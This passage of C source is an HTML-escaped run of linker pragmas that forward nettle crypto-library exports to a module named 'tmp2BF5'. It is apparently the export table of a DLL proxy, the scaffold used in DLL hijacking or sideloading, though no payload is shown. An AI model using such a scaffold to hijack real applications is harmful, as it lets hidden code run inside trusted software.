&quot;/export:nettle_ccm_aes256_set_key=tmp2BF5.nettle_ccm_aes256_set_key,@171&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_aes256_set_nonce=tmp2BF5.nettle_ccm_aes256_set_nonce,@172&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_aes256_update=tmp2BF5.nettle_ccm_aes256_update,@173&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_decrypt=tmp2BF5.nettle_ccm_decrypt,@174&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_decrypt_message=tmp2BF5.nettle_ccm_decrypt_message,@175&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_digest=tmp2BF5.nettle_ccm_digest,@176&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_encrypt=tmp2BF5.nettle_ccm_encrypt,@177&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_encrypt_message=tmp2BF5.nettle_ccm_encrypt_message,@178&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_set_nonce=tmp2BF5.nettle_ccm_set_nonce,@179&quot;)#pragma comment(linker, &quot;/export:nettle_ccm_update=tmp2BF5.nettle_ccm_update,@180&quot;)#pragma comment(linker, &quot;/export:nettle_cfb8_decrypt=tmp2BF5.nettle_cfb8_decrypt,@181&quot;)#pragma comment(linker, &quot;/export:nettle_cfb8_encrypt=tmp2BF5.nettle_cfb8_encrypt,@182&quot;)#pragma comment(linker, &quot;/export:nettle_cfb_decrypt=tmp2BF5.nettle_cfb_decrypt,@183&quot;)#pragma comment(linker, &quot;/export:nettle_cfb_encrypt=tmp2BF5.nettle_cfb_encrypt,@184&quot;)#pragma comment(linker, &quot;/export:nettle_chacha_crypt=tmp2BF5.nettle_chacha_crypt,@185&quot;)#pragma comment(linker, &quot;/export:nettle_chacha_crypt32=tmp2BF5.nettle_chacha_crypt32,@186&quot;)#pragma comment(linker, &quot;/export:nettle_chacha_poly1305=tmp2BF5.nettle_chacha_poly1305,@187&quot;)#pragma comment(linker, &quot;/export:nettle_chacha_poly1305_decrypt=tmp2BF5.nettle_chacha_poly1305_decrypt,@188&quot;)#pragma comment(linker, &quot;/export:nettle_chacha_poly1305_digest=tmp2BF5.nettle_chacha_poly1305_digest,@189&quot;)#pragma comment(linker, &quot;/export:nettle_chacha_poly1305_encrypt=tmp2BF5.nettle_chacha_poly1305_encrypt,@190&quot;)#pragma comment(linker, &quot;/export:nettle_chacha_poly1305_set_key=tmp2BF5.nettle_chacha_poly1305_set_key,@191&quot;)#pragma comment(linker, &quot;/export:nettle_chacha_poly1305_set_nonce=tmp2BF5.nettle_chacha_poly1305_set_nonce,@192&quot;)#pragma comment(linker, &quot;/export:nettle_chacha_poly1305_update=tmp2BF5.nettle_chacha_poly1305_update,@193&quot;)#pragma comment(linker, &quot;/export:nettle_chacha_set_counter=tmp2BF5.nettle_chacha_set_counter,@194&quot;)#pragma comment(linker, &quot;/export:nettle_chacha_set_counter32=tmp2BF5.nettle_chacha_set_counter32,@195&quot;)#pragma comment(linker, &quot;/export:nettle_chacha_set_key=tmp2BF5.nettle_chacha_set_key,@196&quot;)#pragma comment(linker, &quot;/export:nettle_chacha_set_nonce=tmp2BF5.nettle_chacha_set_nonce,@197&quot;)#pragma comment(linker, &quot;/export:nettle_chacha_set_nonce96=tmp2BF5.nettle_chacha_set_nonce96,@198&quot;)#pragma comment(linker, &quot;/export:nettle_cmac128_digest=tmp2BF5.nettle_cmac128_digest,@199&quot;)#pragma comment(linker, &quot;/export:nettle_cmac128_init=tmp2BF5.nettle_cmac128_init,@200&quot;)#pragma comment(linker, &quot;/export:nettle_cmac128_set_key=tmp2BF5.nettle_cmac128_set_key,@201&quot;)#pragma comment(linker, &quot;/export:nettle_cmac128_update=tmp2BF5.nettle_cmac128_update,@202&quot;)#pragma comment(linker, &quot;/export:nettle_cmac64_digest=tmp2BF5.nettle_cmac64_digest,@203&quot;)#pragma comment(linker, &quot;/export:nettle_cmac64_init=tmp2BF5.nettle_cmac64_init,@204&quot;)#pragma comment(linker, &quot;/export:nettle_cmac64_set_key=tmp2BF5.nettle_cmac64_set_key,@205&quot;)#pragma comment(linker, &quot;/export:nettle_cmac64_update=tmp2BF5.nettle_cmac64_update,@206&quot;)#pragma comment(linker, &quot;/export:nettle_cmac_aes128=tmp2BF5.nettle_cmac_aes128,@207&quot;)#pragma comment(linker, &quot;/export:nettle_cmac_aes128_digest=tmp2BF5.nettle_cmac_aes128_digest,@208&quot;)#pragma comment(linker, &quot;/export:nettle_cmac_aes128_set_key=tmp2BF5.nettle_cmac_aes128_set_key,@209&quot;)#pragma comment(linker, &quot;/export:nettle_cmac_aes128_update=tmp2BF5.nettle_cmac_aes128_update,@210&quot;)#pragma comment(linker, &quot;/export:nettle_cmac_aes256=tmp2BF5.nettle_cmac_aes256,@211&quot;)#pragma comment(linker, &quot;/export:nettle_cmac_aes256_digest=tmp2BF5.nettle_cmac_aes256_digest,@212&quot;)#pragma comment(linker, &quot;/export:nettle_cmac_aes256_set_key=tmp2BF5.nettle_cmac_aes256_set_key,@213&quot;)#pragma comment(linker, &quot;/export:nettle_cmac_aes256_update=tmp2BF5.nettle_cmac_aes256_update,@214&quot;)#pragma comment(linker, &quot;/export:nettle_cmac_des3=tmp2BF5.nettle_cmac_des3,@215&quot;)#pragma comment(linker, &quot;/export:nettle_cmac_des3_digest=tmp2BF5.nettle_cmac_des3_digest,@216&quot;)#pragma comment(linker, &quot;/export:nettle_cmac_des3_set_key=tmp2BF5.nettle_cmac_des3_set_key,@217&quot;)#pragma comment(linker, &quot;/export:nettle_cmac_des3_update=tmp2BF5.nettle_cmac_des3_update,@218&quot;)#pragma comment(linker, &quot;/export:nettle_cnd_memcpy=tmp2BF5.nettle_cnd_memcpy,@219&quot;)#pragma comment(linker, &quot;/export:nettle_ctr_crypt=tmp2BF5.nettle_ctr_crypt,@220&quot;)#pragma comment(linker, &quot;/export:nettle_des3_decrypt=tmp2BF5.nettle_des3_decrypt,@221&quot;)#pragma comment(linker, &quot;/export:nettle_des3_encrypt=tmp2BF5.nettle_des3_encrypt,@222&quot;)#pragma comment(linker, &quot;/export:nettle_des3_set_key=tmp2BF5.nettle_des3_set_key,@223&quot;)#pragma comment(linker, &quot;/export:nettle_des_check_parity=tmp2BF5.nettle_des_check_parity,@224&quot;)#pragma comment(linker, &quot;/export:nettle_des_decrypt=tmp2BF5.nettle_des_decrypt,@225&quot;)#pragma comment(linker, &quot;/export:nettle_des_encrypt=tmp2BF5.nettle_des_encrypt,@226&quot;)#pragma comment(linker, &quot;/export:nettle_des_fix_parity=tmp2BF5.nettle_des_fix_parity,@227&quot;)#pragma comment(linker, &quot;/export:nettle_des_set_key=tmp2BF5.nettle_des_set_key,@228&quot;)#pragma comment(linker, &quot;/export:nettle_eax_aes128=tmp2BF5.nettle_eax_aes128,@229&quot;)#pragma comment(linker, &quot;/export:nettle_eax_aes128_decrypt=tmp2BF5.nettle_eax_aes128_decrypt,@230&quot;)#pragma comment(linker, &quot;/export:nettle_eax_aes128_digest=tmp2BF5.nettle_eax_aes128_digest,@231&quot;)#pragma comment(linker, &quot;/export:nettle_eax_aes128_encrypt=tmp2BF5.nettle_eax_aes128_encrypt,@232&quot;)#pragma comment(linker, &quot;/export:nettle_eax_aes128_set_key=tmp2BF5.nettle_eax_aes128_set_key,@233&quot;)#pragma comment(linker, &quot;/export:nettle_eax_aes128_set_nonce=tmp2BF5.nettle_eax_aes128_set_nonce,@234&quot;)#pragma comment(linker, &quot;/export:nettle_eax_aes128_update=tmp2BF5.nettle_eax_aes128_update,@235&quot;)#pragma comment(linker, &quot;/export:nettle_eax_decrypt=tmp2BF5.nettle_eax_decrypt,@236&quot;)#pragma comment(linker, &quot;/export:nettle_eax_digest=tmp2BF5.nettle_eax_digest,@237&quot;)#pragma comment(linker, &quot;/export:nettle_eax_encrypt=tmp2BF5.nettle_eax_encrypt,@238&quot;)#pragma comment(linker, &quot;/export:nettle_eax_set_key=tmp2BF5.nettle_eax_set_key,@239&quot;)#pragma comment(linker, &quot;/export:nettle_eax_set_nonce=tmp2BF5.nettle_eax_set_nonce,@240&quot;)#pragma comment(linker, &quot;/export:nettle_eax_update=tmp2BF5.nettle_eax_update,@241&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes128=tmp2BF5.nettle_gcm_aes128,@242&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes128_decrypt=tmp2BF5.nettle_gcm_aes128_decrypt,@243&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes128_digest=tmp2BF5.nettle_gcm_aes128_digest,@244&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes128_encrypt=tmp2BF5.nettle_gcm_aes128_encrypt,@245&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes128_set_iv=tmp2BF5.nettle_gcm_aes128_set_iv,@246&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes128_set_key=tmp2BF5.nettle_gcm_aes128_set_key,@247&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes128_update=tmp2BF5.nettle_gcm_aes128_update,@248&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes192=tmp2BF5.nettle_gcm_aes192,@249&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes192_decrypt=tmp2BF5.nettle_gcm_aes192_decrypt,@250&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes192_digest=tmp2BF5.nettle_gcm_aes192_digest,@251&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes192_encrypt=tmp2BF5.nettle_gcm_aes192_encrypt,@252&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes192_set_iv=tmp2BF5.nettle_gcm_aes192_set_iv,@253&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes192_set_key=tmp2BF5.nettle_gcm_aes192_set_key,@254&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes192_update=tmp2BF5.nettle_gcm_aes192_update,@255&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes256=tmp2BF5.nettle_gcm_aes256,@256&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes256_decrypt=tmp2BF5.nettle_gcm_aes256_decrypt,@257&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes256_digest=tmp2BF5.nettle_gcm_aes256_digest,@258&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes256_encrypt=tmp2BF5.nettle_gcm_aes256_encrypt,@259&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes256_set_iv=tmp2BF5.nettle_gcm_aes256_set_iv,@260&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes256_set_key=tmp2BF5.nettle_gcm_aes256_set_key,@261&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes256_update=tmp2BF5.nettle_gcm_aes256_update,@262&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes_decrypt=tmp2BF5.nettle_gcm_aes_decrypt,@263&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes_digest=tmp2BF5.nettle_gcm_aes_digest,@264&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes_encrypt=tmp2BF5.nettle_gcm_aes_encrypt,@265&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes_set_iv=tmp2BF5.nettle_gcm_aes_set_iv,@266&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes_set_key=tmp2BF5.nettle_gcm_aes_set_key,@267&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes_update=tmp2BF5.nettle_gcm_aes_update,@268&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_camellia128=tmp2BF5.nettle_gcm_camellia128,@269&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_camellia128_decrypt=tmp2BF5.nettle_gcm_camellia128_decrypt,@270&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_camellia128_digest=tmp2BF5.nettle_gcm_camellia128_digest,@271&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_camellia128_encrypt=tmp2BF5.nettle_gcm_camellia128_encrypt,@272&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_camellia128_set_iv=tmp2BF5.nettle_gcm_camellia128_set_iv,@273&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_camellia128_set_key=tmp2BF5.nettle_gcm_camellia128_set_key,@274&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_camellia128_update=tmp2BF5.nettle_gcm_camellia128_update,@275&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_camellia256=tmp2BF5.nettle_gcm_camellia256,@276&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_camellia256_decrypt=tmp2BF5.nettle_gcm_camellia256_decrypt,@277&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_camellia256_digest=tmp2BF5.nettle_gcm_camellia256_digest,@278&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_camellia256_encrypt=tmp2BF5.nettle_gcm_camellia256_encrypt,@279&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_camellia256_set_iv=tmp2BF5.nettle_gcm_camellia256_set_iv,@280&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_camellia256_set_key=tmp2BF5.nettle_gcm_camellia256_set_key,@281&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_camellia256_update=tmp2BF5.nettle_gcm_camellia256_update,@282&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_decrypt=tmp2BF5.nettle_gcm_decrypt,@283&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_digest=tmp2BF5.nettle_gcm_digest,@284&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_encrypt=tmp2BF5.nettle_gcm_encrypt,@285&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_set_iv=tmp2BF5.nettle_gcm_set_iv,@286&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_set_key=tmp2BF5.nettle_gcm_set_key,@287&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_update=tmp2BF5.nettle_gcm_update,@288&quot;)#pragma comment(linker, &quot;/export:nettle_get_aeads=tmp2BF5.nettle_get_aeads,@289&quot;)#pragma comment(linker, &quot;/export:nettle_get_armors=tmp2BF5.nettle_get_armors,@290&quot;)#pragma comment(linker, &quot;/export:nettle_get_ciphers=tmp2BF5.nettle_get_ciphers,@291&quot;)#pragma comment(linker, &quot;/export:nettle_get_hashes=tmp2BF5.nettle_get_hashes,@292&quot;)#pragma comment(linker, &quot;/export:nettle_get_macs=tmp2BF5.nettle_get_macs,@293&quot;)#pragma comment(linker, &quot;/export:nettle_gosthash94=tmp2BF5.nettle_gosthash94,@294&quot;)#pragma comment(linker, &quot;/export:nettle_gosthash94_digest=tmp2BF5.nettle_gosthash94_digest,@295&quot;)#pragma comment(linker, &quot;/export:nettle_gosthash94_init=tmp2BF5.nettle_gosthash94_init,@296&quot;)#pragma comment(linker, &quot;/export:nettle_gosthash94_update=tmp2BF5.nettle_gosthash94_update,@297&quot;)#pragma comment(linker, &quot;/export:nettle_gosthash94cp=tmp2BF5.nettle_gosthash94cp,@298&quot;)#pragma comment(linker, &quot;/export:nettle_gosthash94cp_digest=tmp2BF5.nettle_gosthash94cp_digest,@299&quot;)#pragma comment(linker, &quot;/export:nettle_gosthash94cp_update=tmp2BF5.nettle_gosthash94cp_update,@300&quot;)#pragma comment(linker, &quot;/export:nettle_hkdf_expand=tmp2BF5.nettle_hkdf_expand,@301&quot;)#pragma comment(linker, &quot;/export:nettle_hkdf_extract=tmp2BF5.nettle_hkdf_extract,@302&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_digest=tmp2BF5.nettle_hmac_digest,@303&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_gosthash94_digest=tmp2BF5.nettle_hmac_gosthash94_digest,@304&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_gosthash94_set_key=tmp2BF5.nettle_hmac_gosthash94_set_key,@305&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_gosthash94_update=tmp2BF5.nettle_hmac_gosthash94_update,@306&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_gosthash94cp_digest=tmp2BF5.nettle_hmac_gosthash94cp_digest,@307&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_gosthash94cp_set_key=tmp2BF5.nettle_hmac_gosthash94cp_set_key,@308&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_gosthash94cp_update=tmp2BF5.nettle_hmac_gosthash94cp_update,@309&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_md5=tmp2BF5.nettle_hmac_md5,@310&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_md5_digest=tmp2BF5.nettle_hmac_md5_digest,@311&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_md5_set_key=tmp2BF5.nettle_hmac_md5_set_key,@312&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_md5_update=tmp2BF5.nettle_hmac_md5_update,@313&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_ripemd160=tmp2BF5.nettle_hmac_ripemd160,@314&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_ripemd160_digest=tmp2BF5.nettle_hmac_ripemd160_digest,@315&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_ripemd160_set_key=tmp2BF5.nettle_hmac_ripemd160_set_key,@316&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_ripemd160_update=tmp2BF5.nettle_hmac_ripemd160_update,@317&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_set_key=tmp2BF5.nettle_hmac_set_key,@318&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_sha1=tmp2BF5.nettle_hmac_sha1,@319&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_sha1_digest=tmp2BF5.nettle_hmac_sha1_digest,@320&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_sha1_set_key=tmp2BF5.nettle_hmac_sha1_set_key,@321&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_sha1_update=tmp2BF5.nettle_hmac_sha1_update,@322&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_sha224=tmp2BF5.nettle_hmac_sha224,@323&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_sha224_digest=tmp2BF5.nettle_hmac_sha224_digest,@324&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_sha224_set_key=tmp2BF5.nettle_hmac_sha224_set_key,@325&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_sha256=tmp2BF5.nettle_hmac_sha256,@326&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_sha256_digest=tmp2BF5.nettle_hmac_sha256_digest,@327&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_sha256_set_key=tmp2BF5.nettle_hmac_sha256_set_key,@328&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_sha256_update=tmp2BF5.nettle_hmac_sha256_update,@329&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_sha384=tmp2BF5.nettle_hmac_sha384,@330&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_sha384_digest=tmp2BF5.nettle_hmac_sha384_digest,@331&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_sha384_set_key=tmp2BF5.nettle_hmac_sha384_set_key,@332&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_sha512=tmp2BF5.nettle_hmac_sha512,@333&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_sha512_digest=tmp2BF5.nettle_hmac_sha512_digest,@334&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_sha512_set_key=tmp2BF5.nettle_hmac_sha512_set_key,@335&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_sha512_update=tmp2BF5.nettle_hmac_sha512_update,@336&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_update=tmp2BF5.nettle_hmac_update,@337&quot;)#pragma comment(linker, &quot;/export:nettle_knuth_lfib_get=tmp2BF5.nettle_knuth_lfib_get,@338&quot;)#pragma comment(linker, &quot;/export:nettle_knuth_lfib_get_array=tmp2BF5.nettle_knuth_lfib_get_array,@339&quot;)#pragma comment(linker, &quot;/export:nettle_knuth_lfib_init=tmp2BF5.nettle_knuth_lfib_init,@340&quot;)#pragma comment(linker, &quot;/export:nettle_knuth_lfib_random=tmp2BF5.nettle_knuth_lfib_random,@341&quot;)#pragma comment(linker, &quot;/export:nettle_lookup_hash=tmp2BF5.nettle_lookup_hash,@342&quot;)#pragma comment(linker, &quot;/export:nettle_md2=tmp2BF5.nettle_md2,@343&quot;)#pragma comment(linker, &quot;/export:nettle_md2_digest=tmp2BF5.nettle_md2_digest,@344&quot;)#pragma comment(linker, &quot;/export:nettle_md2_init=tmp2BF5.nettle_md2_init,@345&quot;)#pragma comment(linker, &quot;/export:nettle_md2_update=tmp2BF5.nettle_md2_update,@346&quot;)#pragma comment(linker, &quot;/export:nettle_md4=tmp2BF5.nettle_md4,@347&quot;)#pragma comment(linker, &quot;/export:nettle_md4_digest=tmp2BF5.nettle_md4_digest,@348&quot;)#pragma comment(linker, &quot;/export:nettle_md4_init=tmp2BF5.nettle_md4_init,@349&quot;)#pragma comment(linker, &quot;/export:nettle_md4_update=tmp2BF5.nettle_md4_update,@350&quot;)#pragma comment(linker, &quot;/export:nettle_md5=tmp2BF5.nettle_md5,@351&quot;)#pragma comment(linker, &quot;/export:nettle_md5_compress=tmp2BF5.nettle_md5_compress,@352&quot;)#pragma comment(linker, &quot;/export:nettle_md5_digest=tmp2BF5.nettle_md5_digest,@353&quot;)#pragma comment(linker, &quot;/export:nettle_md5_init=tmp2BF5.nettle_md5_init,@354&quot;)#pragma comment(linker, &quot;/export:nettle_md5_update=tmp2BF5.nettle_md5_update,@355&quot;)#pragma comment(linker, &quot;/export:nettle_memeql_sec=tmp2BF5.nettle_memeql_sec,@356&quot;)#pragma comment(linker, &quot;/export:nettle_memxor=tmp2BF5.nettle_memxor,@357&quot;)#pragma comment(linker, &quot;/export:nettle_memxor3=tmp2BF5.nettle_memxor3,@358&quot;)#pragma comment(linker, &quot;/export:nettle_pbkdf2=tmp2BF5.nettle_pbkdf2,@359&quot;)#pragma comment(linker, &quot;/export:nettle_pbkdf2_hmac_gosthash94cp=tmp2BF5.nettle_pbkdf2_hmac_gosthash94cp,@360&quot;)#pragma comment(linker, &quot;/export:nettle_pbkdf2_hmac_sha1=tmp2BF5.nettle_pbkdf2_hmac_sha1,@361&quot;)#pragma comment(linker, &quot;/export:nettle_pbkdf2_hmac_sha256=tmp2BF5.nettle_pbkdf2_hmac_sha256,@362&quot;)#pragma comment(linker, &quot;/export:nettle_poly1305_aes_digest=tmp2BF5.nettle_poly1305_aes_digest,@363&quot;)#pragma comment(linker, &quot;/export:nettle_poly1305_aes_set_key=tmp2BF5.nettle_poly1305_aes_set_key,@364&quot;)#pragma comment(linker, &quot;/export:nettle_poly1305_aes_set_nonce=tmp2BF5.nettle_poly1305_aes_set_nonce,@365&quot;)#pragma comment(linker, &quot;/export:nettle_poly1305_aes_update=tmp2BF5.nettle_poly1305_aes_update,@366&quot;)#pragma comment(linker, &quot;/export:nettle_realloc=tmp2BF5.nettle_realloc,@367&quot;)#pragma comment(linker, &quot;/export:nettle_ripemd160=tmp2BF5.nettle_ripemd160,@368&quot;)#pragma comment(linker, &quot;/export:nettle_ripemd160_digest=tmp2BF5.nettle_ripemd160_digest,@369&quot;)#pragma comment(linker, &quot;/export:nettle_ripemd160_init=tmp2BF5.nettle_ripemd160_init,@370&quot;)#pragma comment(linker, &quot;/export:nettle_ripemd160_update=tmp2BF5.nettle_ripemd160_update,@371&quot;)#pragma comment(linker, &quot;/export:nettle_salsa20_128_set_key=tmp2BF5.nettle_salsa20_128_set_key,@372&quot;)#pragma comment(linker, &quot;/export:nettle_salsa20_256_set_key=tmp2BF5.nettle_salsa20_256_set_key,@373&quot;)#pragma comment(linker, &quot;/export:nettle_salsa20_crypt=tmp2BF5.nettle_salsa20_crypt,@374&quot;)#pragma comment(linker, &quot;/export:nettle_salsa20_set_key=tmp2BF5.nettle_salsa20_set_key,@375&quot;)#pragma comment(linker, &quot;/export:nettle_salsa20_set_nonce=tmp2BF5.nettle_salsa20_set_nonce,@376&quot;)#pragma comment(linker, &quot;/export:nettle_salsa20r12_crypt=tmp2BF5.nettle_salsa20r12_crypt,@377&quot;)#pragma comment(linker, &quot;/export:nettle_serpent128=tmp2BF5.nettle_serpent128,@378&quot;)#pragma comment(linker, &quot;/export:nettle_serpent128_set_key=tmp2BF5.nettle_serpent128_set_key,@379&quot;)#pragma comment(linker, &quot;/export:nettle_serpent192=tmp2BF5.nettle_serpent192,@380&quot;)#pragma comment(linker, &quot;/export:nettle_serpent192_set_key=tmp2BF5.nettle_serpent192_set_key,@381&quot;)#pragma comment(linker, &quot;/export:nettle_serpent256=tmp2BF5.nettle_serpent256,@382&quot;)#pragma comment(linker, &quot;/export:nettle_serpent256_set_key=tmp2BF5.nettle_serpent256_set_key,@383&quot;)#pragma comment(linker, &quot;/export:nettle_serpent_decrypt=tmp2BF5.nettle_serpent_decrypt,@384&quot;)#pragma comment(linker, &quot;/export:nettle_serpent_encrypt=tmp2BF5.nettle_serpent_encrypt,@385&quot;)#pragma comment(linker, &quot;/export:nettle_serpent_set_key=tmp2BF5.nettle_serpent_set_key,@386&quot;)#pragma comment(linker, &quot;/export:nettle_sha1=tmp2BF5.nettle_sha1,@387&quot;)#pragma comment(linker, &quot;/export:nettle_sha1_compress=tmp2BF5.nettle_sha1_compress,@388&quot;)#pragma comment(linker, &quot;/export:nettle_sha1_digest=tmp2BF5.nettle_sha1_digest,@389&quot;)#pragma comment(linker, &quot;/export:nettle_sha1_init=tmp2BF5.nettle_sha1_init,@390&quot;)#pragma comment(linker, &quot;/export:nettle_sha1_update=tmp2BF5.nettle_sha1_update,@391&quot;)#pragma comment(linker, &quot;/export:nettle_sha224=tmp2BF5.nettle_sha224,@392&quot;)#pragma comment(linker, &quot;/export:nettle_sha224_digest=tmp2BF5.nettle_sha224_digest,@393&quot;)#pragma comment(linker, &quot;/export:nettle_sha224_init=tmp2BF5.nettle_sha224_init,@394&quot;)#pragma comment(linker, &quot;/export:nettle_sha256=tmp2BF5.nettle_sha256,@395&quot;)#pragma comment(linker, &quot;/export:nettle_sha256_digest=tmp2BF5.nettle_sha256_digest,@396&quot;)#pragma comment(linker, &quot;/export:nettle_sha256_init=tmp2BF5.nettle_sha256_init,@397&quot;)#pragma comment(linker, &quot;/export:nettle_sha256_update=tmp2BF5.nettle_sha256_update,@398&quot;)#pragma comment(linker, &quot;/export:nettle_sha384=tmp2BF5.nettle_sha384,@399&quot;)#pragma comment(linker, &quot;/export:nettle_sha384_digest=tmp2BF5.nettle_sha384_digest,@400&quot;)#pragma comment(linker, &quot;/export:nettle_sha384_init=tmp2BF5.nettle_sha384_init,@401&quot;)#pragma comment(linker, &quot;/export:nettle_sha3_224=tmp2BF5.nettle_sha3_224,@402&quot;)#pragma comment(linker, &quot;/export:nettle_sha3_224_digest=tmp2BF5.nettle_sha3_224_digest,@403&quot;)#pragma comment(linker, &quot;/export:nettle_sha3_224_init=tmp2BF5.nettle_sha3_224_init,@404&quot;)#pragma comment(linker, &quot;/export:nettle_sha3_224_update=tmp2BF5.nettle_sha3_224_update,@405&quot;)#pragma comment(linker, &quot;/export:nettle_sha3_256=tmp2BF5.nettle_sha3_256,@406&quot;)#pragma comment(linker, &quot;/export:nettle_sha3_256_digest=tmp2BF5.nettle_sha3_256_digest,@407&quot;)#pragma comment(linker, &quot;/export:nettle_sha3_256_init=tmp2BF5.nettle_sha3_256_init,@408&quot;)#pragma comment(linker, &quot;/export:nettle_sha3_256_shake=tmp2BF5.nettle_sha3_256_shake,@409&quot;)#pragma comment(linker, &quot;/export:nettle_sha3_256_update=tmp2BF5.nettle_sha3_256_update,@410&quot;)#pragma comment(linker, &quot;/export:nettle_sha3_384=tmp2BF5.nettle_sha3_384,@411&quot;)#pragma comment(linker, &quot;/export:nettle_sha3_384_digest=tmp2BF5.nettle_sha3_384_digest,@412&quot;)#pragma comment(linker, &quot;/export:nettle_sha3_384_init=tmp2BF5.nettle_sha3_384_init,@413&quot;)#pragma comment(linker, &quot;/export:nettle_sha3_384_update=tmp2BF5.nettle_sha3_384_update,@414&quot;)#pragma comment(linker, &quot;/export:nettle_sha3_512=tmp2BF5.nettle_sha3_512,@415&quot;)#pragma comment(linker, &quot;/export:nettle_sha3_512_digest=tmp2BF5.nettle_sha3_512_digest,@416&quot;)#pragma comment(linker, &quot;/export:nettle_sha3_512_init=tmp2BF5.nettle_sha3_512_init,@417&quot;)#pragma comment(linker, &quot;/export:nettle_sha3_512_update=tmp2BF5.nettle_sha3_512_update,@418&quot;)#pragma comment(linker, &quot;/export:nettle_sha3_permute=tmp2BF5.nettle_sha3_permute,@419&quot;)#pragma comment(linker, &quot;/export:nettle_sha512=tmp2BF5.nettle_sha512,@420&quot;)#pragma comment(linker, &quot;/export:nettle_sha512_224=tmp2BF5.nettle_sha512_224,@421&quot;)#pragma comment(linker, &quot;/export:nettle_sha512_224_digest=tmp2BF5.nettle_sha512_224_digest,@422&quot;)#pragma comment(linker, &quot;/export:nettle_sha512_224_init=tmp2BF5.nettle_sha512_224_init,@423&quot;)#pragma comment(linker, &quot;/export:nettle_sha512_256=tmp2BF5.nettle_sha512_256,@424&quot;)#pragma comment(linker, &quot;/export:nettle_sha512_256_digest=tmp2BF5.nettle_sha512_256_digest,@425&quot;)#pragma comment(linker, &quot;/export:nettle_sha512_256_init=tmp2BF5.nettle_sha512_256_init,@426&quot;)#pragma comment(linker, &quot;/export:nettle_sha512_digest=tmp2BF5.nettle_sha512_digest,@427&quot;)#pragma comment(linker, 